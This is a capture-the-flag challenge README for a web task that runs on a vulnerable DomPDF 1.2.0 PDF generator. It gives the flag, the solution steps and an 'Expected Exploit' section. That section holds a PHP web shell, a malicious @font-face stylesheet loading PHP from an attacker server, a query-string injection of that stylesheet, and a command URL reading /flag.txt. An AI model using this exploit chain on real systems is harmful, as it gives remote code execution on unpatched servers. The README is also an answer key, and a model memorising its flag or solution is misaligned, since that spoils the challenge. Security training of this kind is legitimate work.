# Web8 - EduCard Pro Report Card Generator

## Challenge Description
Create Professional Digital Report Cards Instantly! Generate beautiful PDF report cards for your students with our new digital platform. Find the flag file in /flag.txt at the root of the filesystem.

## Challenge Details
- **Category**: Web
- **Difficulty**: Medium
- **Points**: 200
- **Flag**: `flag{a4d52beabcfdeb6ba79fc08709bb5508}`

## Vulnerability
This challenge exploits a DomPDF RCE vulnerability in version 1.2.0. The application allows users to create digital report cards and generates PDF reports using DomPDF with remote file inclusion enabled.

## Solution Path
1. Submit the form and notice the PDF generation
2. Intercept the PDF generation request in Burp (change filter to include binary)
3. Identify DomPDF version 1.2.0 in the PDF metadata
4. Research DomPDF RCE vulnerability
5. Create malicious CSS with @font-face to load remote PHP file
6. Host the malicious PHP file and CSS on attacker server
7. Inject the CSS via the student name parameter
8. Calculate MD5 hash of the PHP file URL
9. Access the uploaded PHP file at `/vendor/dompdf/dompdf/lib/fonts/`
10. Execute commands to read `/flag.txt`

## Setup Instructions
1. Run `chmod +x setup.sh && ./setup.sh`
2. Run `docker-compose up -d`
3. Access the challenge at `http://localhost:32110`

## Expected Exploit
```bash
# 1. Create malicious PHP file (evil.php)
<?php system($_REQUEST["cmd"]); ?>

# 2. Create malicious CSS (exploit.css)
@font-face {
    font-family: "evil";
    src: url("http://ATTACKER_SERVER/evil.php");
    font-weight: "normal";
    font-style: "normal";
}

# 3. Host files and get MD5
echo -n "http://ATTACKER_SERVER/evil.php" | md5sum

# 4. Trigger the exploit
http://localhost:32110/quote.php?organisation=<link rel=stylesheet href='http://ATTACKER_SERVER/exploit.css'>&email=school@example.com&small=85&medium=90&large=88

# 5. Access uploaded PHP file
http://localhost:32110/vendor/dompdf/dompdf/lib/fonts/evil_normal_[MD5_HASH].php?cmd=cat /flag.txt
```

## Files Structure
- `index.php` - Main report card generation form
- `quote.php` - PDF generation endpoint (vulnerable)
- `composer.json` - Dependencies (DomPDF 1.2.0)
- `Dockerfile` - Container setup
- `docker-compose.yml` - Service configuration
